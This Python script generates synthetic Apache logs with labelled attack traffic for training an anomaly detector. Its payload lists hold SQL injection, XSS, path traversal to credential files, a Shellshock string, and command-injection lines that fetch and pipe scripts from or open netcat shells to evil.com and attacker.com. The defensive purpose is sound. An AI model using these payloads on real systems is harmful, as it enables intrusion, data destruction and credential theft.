#!/usr/bin/env python3
"""
Generate 150k synthetic Apache access logs with realistic attacks and anomalies
for training an anomaly detection model.

Attack Types Included:
1. SQL Injection attempts
2. XSS (Cross-Site Scripting) attacks
3. Path Traversal / Directory Traversal
4. Command Injection
5. Credential Stuffing / Brute Force
6. Web Scanners (Nikto, SQLMap, etc.)
7. Vulnerability Scanning
8. DDoS patterns
9. Data Exfiltration attempts
10. API abuse patterns

Normal Traffic Patterns:
- Legitimate user browsing
- Static resource loading (CSS, JS, images)
- API calls
- Form submissions
- Search queries
"""

import random
import json
from datetime import datetime, timedelta
from pathlib import Path
from collections import defaultdict
import argparse

class ApacheLogGenerator:
    def __init__(self, seed=42):
        random.seed(seed)
        
        # User agents
        self.normal_user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
        ]
        
        self.attack_user_agents = [
            "sqlmap/1.5.2#stable (http://sqlmap.org)",
            "Nikto/2.1.6",
            "python-requests/2.25.1",
            "curl/7.68.0",
            "Wget/1.20.3 (linux-gnu)",
            "() { :; }; /bin/bash -c 'echo vulnerable'",  # Shellshock
            "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
            "masscan/1.0 (https://github.com/robertdavidgraham/masscan)",
        ]
        
        # Normal paths - typical website structure
        self.normal_paths = [
            "/", "/index.html", "/home", "/about", "/contact",
            "/products", "/services", "/blog", "/news",
            "/login", "/register", "/dashboard", "/profile",
            "/search", "/help", "/faq", "/terms", "/privacy",
            "/api/v1/users", "/api/v1/products", "/api/v1/orders",
            "/images/logo.png", "/images/banner.jpg", "/images/icon.svg",
            "/css/style.css", "/css/bootstrap.min.css", "/css/main.css",
            "/js/app.js", "/js/jquery.min.js", "/js/bootstrap.min.js",
            "/fonts/roboto.woff2", "/fonts/opensans.ttf",
            "/favicon.ico", "/robots.txt", "/sitemap.xml",
        ]
        
        # SQL Injection payloads
        self.sqli_payloads = [
            "' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT NULL--",
            "1' AND 1=1--", "' OR 'a'='a", "1 UNION SELECT NULL, NULL, NULL--",
            "' OR 1=1 LIMIT 1--", "admin' OR '1'='1'--", "' UNION ALL SELECT NULL--",
            "1' ORDER BY 1--", "1' ORDER BY 10--", "' WAITFOR DELAY '00:00:05'--",
            "'; DROP TABLE users--", "1; DELETE FROM users--",
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "'-alert('XSS')-'",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
        ]
        
        # Path traversal
        self.path_traversal = [
            "../../../etc/passwd", "../../../../etc/shadow",
            "../../windows/win.ini", "../../../boot.ini",
            "....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/var/www/../../etc/passwd", "....\/....\/....\/etc/passwd",
        ]
        
        # Command injection
        self.cmd_injection = [
            "; ls -la", "| cat /etc/passwd", "&& whoami",
            "; wget http://evil.com/shell.sh", "| nc attacker.com 4444",
            "; curl http://evil.com/malware.sh | bash",
            "&& ping -c 10 attacker.com", "| sleep 10",
        ]
        
        # Scanner signatures
        self.scanner_paths = [
            "/admin/", "/administrator/", "/wp-admin/", "/phpmyadmin/",
            "/cgi-bin/", "/.git/", "/.svn/", "/.env",
            "/config.php", "/wp-config.php", "/configuration.php",
            "/.aws/credentials", "/.ssh/id_rsa", "/backup.sql",
            "/phpinfo.php", "/test.php", "/info.php", "/shell.php",
            "/manager/html", "/admin/login.jsp", "/console/login/LoginForm.html",
        ]
        
        # API abuse patterns
        self.api_endpoints = [
            "/api/v1/users", "/api/v1/admin", "/api/v1/orders",
            "/api/v1/payments", "/api/v1/config", "/api/v1/internal",
            "/api/v2/users", "/api/graphql", "/api/v1/export",
        ]
        
        # Status codes
        self.normal_status_codes = [200, 200, 200, 200, 304, 301, 302]
        self.error_status_codes = [400, 401, 403, 404, 500, 503]
        
        # IP ranges for different actor types
        self.normal_ips = self._generate_normal_ips(100)
        self.attacker_ips = self._generate_attacker_ips(20)
        
    def _generate_normal_ips(self, count):
        """Generate realistic normal user IPs"""
        ips = []
        for _ in range(count):
            # Mix of different network ranges
            if random.random() < 0.6:
                # Home users (cable/DSL)
                ip = f"{random.choice([24, 32, 71, 98])}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            else:
                # Corporate/cloud
                ip = f"{random.choice([10, 172, 192])}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            ips.append(ip)
        return ips
    
    def _generate_attacker_ips(self, count):
        """Generate IPs for attackers (often from VPS/cloud)"""
        ips = []
        for _ in range(count):
            # Common VPS/botnet ranges
            ip = f"{random.choice([45, 51, 62, 85, 91, 103, 107, 134, 138, 185])}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            ips.append(ip)
        return ips
    
    def _format_log(self, ip, timestamp, method, path, protocol, status, size, referer, user_agent):
        """Format Apache Combined Log Format"""
        ts_str = timestamp.strftime('%d/%b/%Y:%H:%M:%S +0000')
        return f'{ip} - - [{ts_str}] "{method} {path} {protocol}" {status} {size} "{referer}" "{user_agent}"'
    
    def generate_normal_request(self, timestamp, user_session):
        """Generate a normal user request"""
        ip = user_session['ip']
        user_agent = user_session['user_agent']
        
        # Simulate realistic browsing
        if random.random() < 0.1:
            # New page load
            path = random.choice(self.normal_paths)
            method = "GET"
            status = random.choice([200, 304])
            size = random.randint(5000, 50000)
            referer = random.choice(["-", "https://google.com/", "https://www.google.com/search?q=example"])
            user_session['last_page'] = path
        elif random.random() < 0.7:
            # Static resource (CSS, JS, images)
            resource_type = random.choice(['css', 'js', 'images', 'fonts'])
            if resource_type == 'css':
                path = f"/css/{random.choice(['main', 'style', 'bootstrap', 'theme'])}.css"
                size = random.randint(1000, 20000)
            elif resource_type == 'js':
                path = f"/js/{random.choice(['app', 'main', 'jquery', 'bootstrap'])}.js"
                size = random.randint(5000, 100000)
            elif resource_type == 'images':
                ext = random.choice(['png', 'jpg', 'svg', 'gif'])
                path = f"/images/{random.choice(['logo', 'banner', 'icon', 'photo'])}.{ext}"
                size = random.randint(1000, 500000)
            else:
                path = f"/fonts/{random.choice(['roboto', 'opensans'])}.{random.choice(['woff2', 'ttf'])}"
                size = random.randint(10000, 100000)
            
            method = "GET"
            status = random.choice([200, 304])
            referer = user_session.get('last_page', '/')
        else:
            # API call or form submission
            if random.random() < 0.3:
                method = random.choice(["POST", "PUT", "DELETE"])
                path = random.choice(self.api_endpoints)
                status = random.choice([200, 201, 400, 401])
            else:
                method = "GET"
                path = f"{random.choice(self.normal_paths)}?id={random.randint(1, 1000)}"
                status = random.choice([200, 404])
            
            size = random.randint(100, 5000)
            referer = user_session.get('last_page', '/')
        
        return self._format_log(ip, timestamp, method, path, "HTTP/1.1", status, size, referer, user_agent)
    
    def generate_sqli_attack(self, timestamp):
        """Generate SQL injection attack"""
        ip = random.choice(self.attacker_ips)
        user_agent = random.choice(self.attack_user_agents)
        method = random.choice(["GET", "POST"])
        
        # Target login or search endpoints
        base_path = random.choice(["/login", "/search", "/user", "/product"])
        payload = random.choice(self.sqli_payloads)
        path = f"{base_path}?id={payload}"
        
        # SQL injection usually returns errors or success
        status = random.choice([200, 500, 403])
        size = random.randint(500, 5000)
        
        return self._format_log(ip, timestamp, method, path, "HTTP/1.1", status, size, "-", user_agent)
    
    def generate_xss_attack(self, timestamp):
        """Generate XSS attack"""
        ip = random.choice(self.attacker_ips)
        user_agent = random.choice(self.attack_user_agents)
        method = "GET"
        
        base_path = random.choice(["/search", "/comment", "/profile", "/message"])
        payload = random.choice(self.xss_payloads)
        path = f"{base_path}?q={payload}"
        
        status = random.choice([200, 400, 403])
        size = random.randint(500, 3000)
        
        return self._format_log(ip, timestamp, method, path, "HTTP/1.1", status, size, "-", user_agent)
    
    def generate_path_traversal(self, timestamp):
        """Generate path traversal attack"""
        ip = random.choice(self.attacker_ips)
        user_agent = random.choice(self.attack_user_agents)
        method = "GET"
        
        path = f"/download?file={random.choice(self.path_traversal)}"
        status = random.choice([403, 404, 500])
        size = random.randint(200, 1000)
        
        return self._format_log(ip, timestamp, method, path, "HTTP/1.1", status, size, "-", user_agent)
    
    def generate_cmd_injection(self, timestamp):
        """Generate command injection attack"""
        ip = random.choice(self.attacker_ips)
        user_agent = random.choice(self.attack_user_agents)
        method = "POST"
        
        base_path = random.choice(["/upload", "/convert", "/process"])
        payload = random.choice(self.cmd_injection)
        path = f"{base_path}?cmd={payload}"
        
        status = random.choice([500, 403, 200])
        size = random.randint(500, 2000)
        
        return self._format_log(ip, timestamp, method, path, "HTTP/1.1", status, size, "-", user_agent)
    
    def generate_brute_force(self, timestamp, session):
        """Generate brute force login attempt"""
        ip = session['ip']
        user_agent = session['user_agent']
        method = "POST"
        
        username = random.choice(['admin', 'root', 'user', 'test', 'administrator'])
        path = f"/login?username={username}"
        
        # Failed attempts
        status = random.choice([401, 403])
        size = random.randint(200, 1000)
        
        return self._format_log(ip, timestamp, method, path, "HTTP/1.1", status, size, "/login", user_agent)
    
    def generate_scanner_probe(self, timestamp):
        """Generate vulnerability scanner probe"""
        ip = random.choice(self.attacker_ips)
        user_agent = random.choice(self.attack_user_agents)
        method = "GET"
        
        path = random.choice(self.scanner_paths)
        status = random.choice([404, 403, 401])
        size = random.randint(200, 1000)
        
        return self._format_log(ip, timestamp, method, path, "HTTP/1.1", status, size, "-", user_agent)
    
    def generate_ddos_pattern(self, timestamp, session):
        """Generate DDoS-like high-frequency requests"""
        ip = session['ip']
        user_agent = session.get('user_agent', random.choice(self.attack_user_agents))
        method = "GET"
        
        # Rapid requests to same endpoint
        path = session.get('target_path', random.choice(self.normal_paths))
        status = random.choice([200, 503, 429])  # 429 = Too Many Requests
        size = random.randint(100, 1000)
        
        return self._format_log(ip, timestamp, method, path, "HTTP/1.1", status, size, "-", user_agent)
    
    def generate_data_exfiltration(self, timestamp):
        """Generate data exfiltration attempt"""
        ip = random.choice(self.attacker_ips)
        user_agent = random.choice(self.attack_user_agents)
        method = "GET"
        
        # Large data export requests
        path = random.choice([
            "/api/v1/export?format=json&limit=999999",
            "/api/v1/users?limit=100000",
            "/backup/database.sql",
            "/api/v1/dump",
            "/admin/export?all=true"
        ])
        
        status = random.choice([200, 403, 401])
        size = random.randint(100000, 10000000) if status == 200 else random.randint(500, 2000)
        
        return self._format_log(ip, timestamp, method, path, "HTTP/1.1", status, size, "-", user_agent)
    
    def generate_api_abuse(self, timestamp, session):
        """Generate API abuse pattern"""
        ip = session['ip']
        user_agent = session.get('user_agent', random.choice(self.attack_user_agents))
        method = random.choice(["GET", "POST", "PUT", "DELETE"])
        
        # Enumerate resources
        resource_id = session.get('resource_id', random.randint(1, 10000))
        path = f"/api/v1/users/{resource_id}"
        
        status = random.choice([404, 401, 403, 200])
        size = random.randint(100, 2000)
        
        return self._format_log(ip, timestamp, method, path, "HTTP/1.1", status, size, "-", user_agent)
    
    def generate_logs(self, total_logs=150000, attack_ratio=0.15):
        """
        Generate synthetic Apache logs
        
        Args:
            total_logs: Total number of log entries
            attack_ratio: Proportion of logs that are attacks (0.15 = 15%)
        """
        logs = []
        start_time = datetime.now() - timedelta(days=7)
        
        # Track sessions for realistic patterns
        normal_sessions = {}
        attack_sessions = defaultdict(dict)
        
        # Initialize normal user sessions
        for ip in random.sample(self.normal_ips, 50):
            normal_sessions[ip] = {
                'ip': ip,
                'user_agent': random.choice(self.normal_user_agents),
                'last_page': '/',
                'request_count': 0
            }
        
        print(f"Generating {total_logs:,} Apache logs ({attack_ratio*100:.1f}% attacks)...")
        print(f"Time range: {start_time} to {start_time + timedelta(days=7)}")
        
        attack_types = {
            'sqli': 0,
            'xss': 0,
            'path_traversal': 0,
            'cmd_injection': 0,
            'brute_force': 0,
            'scanner': 0,
            'ddos': 0,
            'data_exfil': 0,
            'api_abuse': 0
        }
        
        for i in range(total_logs):
            # Progress tracking
            if (i + 1) % 10000 == 0:
                print(f"  Generated {i+1:,}/{total_logs:,} logs...")
            
            # Realistic time progression (not uniform)
            # More traffic during business hours
            hour_weight = random.random()
            if hour_weight < 0.6:
                # Business hours (more traffic)
                time_offset = timedelta(
                    days=random.randint(0, 6),
                    hours=random.randint(9, 17),
                    minutes=random.randint(0, 59),
                    seconds=random.randint(0, 59)
                )
            else:
                # Off hours
                time_offset = timedelta(
                    days=random.randint(0, 6),
                    hours=random.choice(list(range(0, 9)) + list(range(18, 24))),
                    minutes=random.randint(0, 59),
                    seconds=random.randint(0, 59)
                )
            
            timestamp = start_time + time_offset
            
            # Determine if this is an attack or normal traffic
            if random.random() < attack_ratio:
                # Generate attack
                attack_type = random.choices(
                    ['sqli', 'xss', 'path_traversal', 'cmd_injection', 'brute_force', 
                     'scanner', 'ddos', 'data_exfil', 'api_abuse'],
                    weights=[15, 12, 10, 8, 20, 15, 10, 5, 5]
                )[0]
                
                attack_types[attack_type] += 1
                
                if attack_type == 'sqli':
                    log = self.generate_sqli_attack(timestamp)
                elif attack_type == 'xss':
                    log = self.generate_xss_attack(timestamp)
                elif attack_type == 'path_traversal':
                    log = self.generate_path_traversal(timestamp)
                elif attack_type == 'cmd_injection':
                    log = self.generate_cmd_injection(timestamp)
                elif attack_type == 'brute_force':
                    # Simulate persistent brute force session
                    attacker_ip = random.choice(self.attacker_ips)
                    if attacker_ip not in attack_sessions['brute_force']:
                        attack_sessions['brute_force'][attacker_ip] = {
                            'ip': attacker_ip,
                            'user_agent': random.choice(self.attack_user_agents),
                            'attempts': 0
                        }
                    session = attack_sessions['brute_force'][attacker_ip]
                    session['attempts'] += 1
                    log = self.generate_brute_force(timestamp, session)
                elif attack_type == 'scanner':
                    log = self.generate_scanner_probe(timestamp)
                elif attack_type == 'ddos':
                    # Simulate DDoS from multiple IPs
                    attacker_ip = random.choice(self.attacker_ips)
                    if attacker_ip not in attack_sessions['ddos']:
                        attack_sessions['ddos'][attacker_ip] = {
                            'ip': attacker_ip,
                            'user_agent': random.choice(self.attack_user_agents),
                            'target_path': random.choice(self.normal_paths)
                        }
                    log = self.generate_ddos_pattern(timestamp, attack_sessions['ddos'][attacker_ip])
                elif attack_type == 'data_exfil':
                    log = self.generate_data_exfiltration(timestamp)
                else:  # api_abuse
                    attacker_ip = random.choice(self.attacker_ips)
                    if attacker_ip not in attack_sessions['api_abuse']:
                        attack_sessions['api_abuse'][attacker_ip] = {
                            'ip': attacker_ip,
                            'user_agent': random.choice(self.attack_user_agents),
                            'resource_id': 1
                        }
                    session = attack_sessions['api_abuse'][attacker_ip]
                    session['resource_id'] += 1
                    log = self.generate_api_abuse(timestamp, session)
            else:
                # Generate normal traffic
                user_ip = random.choice(list(normal_sessions.keys()))
                session = normal_sessions[user_ip]
                session['request_count'] += 1
                log = self.generate_normal_request(timestamp, session)
            
            logs.append((timestamp, log))
        
        # Sort by timestamp
        logs.sort(key=lambda x: x[0])
        
        # Statistics
        print(f"\n{'='*70}")
        print(f"GENERATION COMPLETE")
        print(f"{'='*70}")
        print(f"Total logs:        {total_logs:,}")
        print(f"Normal traffic:    {total_logs - sum(attack_types.values()):,} ({(1-attack_ratio)*100:.1f}%)")
        print(f"Attack traffic:    {sum(attack_types.values()):,} ({attack_ratio*100:.1f}%)")
        print(f"\nAttack breakdown:")
        for attack_type, count in sorted(attack_types.items(), key=lambda x: x[1], reverse=True):
            print(f"  {attack_type:20s}: {count:6,} ({count/total_logs*100:5.2f}%)")
        
        return [log for _, log in logs], attack_types

def main():
    parser = argparse.ArgumentParser(description='Generate synthetic Apache logs with attacks')
    parser.add_argument('--output', '-o', default='apache_training_150k.log',
                        help='Output log file path')
    parser.add_argument('--total', '-n', type=int, default=150000,
                        help='Total number of logs to generate')
    parser.add_argument('--attack-ratio', '-r', type=float, default=0.15,
                        help='Ratio of attack traffic (0.0-1.0)')
    parser.add_argument('--seed', '-s', type=int, default=42,
                        help='Random seed for reproducibility')
    
    args = parser.parse_args()
    
    # Initialize generator
    generator = ApacheLogGenerator(seed=args.seed)
    
    # Generate logs
    logs, attack_stats = generator.generate_logs(
        total_logs=args.total,
        attack_ratio=args.attack_ratio
    )
    
    # Determine output path
    if Path(args.output).is_absolute():
        output_path = Path(args.output)
    else:
        # Save to data/apache_logs/ by default
        repo_root = Path(__file__).parent.parent
        output_path = repo_root / 'data' / 'apache_logs' / args.output
    
    output_path.parent.mkdir(parents=True, exist_ok=True)
    
    # Write logs
    print(f"\nWriting logs to: {output_path}")
    with open(output_path, 'w') as f:
        for log in logs:
            f.write(log + '\n')
    
    # Create labels file
    labels_path = output_path.parent / f"{output_path.stem}_labels.json"
    labels = {
        'total_logs': args.total,
        'normal_logs': args.total - sum(attack_stats.values()),
        'attack_logs': sum(attack_stats.values()),
        'attack_ratio': args.attack_ratio,
        'attack_types': attack_stats,
        'log_file': output_path.name,
        'generated_at': datetime.now().isoformat()
    }
    
    with open(labels_path, 'w') as f:
        json.dump(labels, f, indent=2)
    
    print(f"✓ Saved labels to: {labels_path}")
    print(f"\n{'='*70}")
    print(f"SUCCESS! Training logs ready for fine-tuning.")
    print(f"{'='*70}")
    print(f"Next steps:")
    print(f"1. Review the log file: {output_path}")
    print(f"2. Create a notebook to fine-tune your OpenStack model on these logs")
    print(f"3. Use the labels file ({labels_path.name}) for supervised training")

if __name__ == '__main__':
    main()
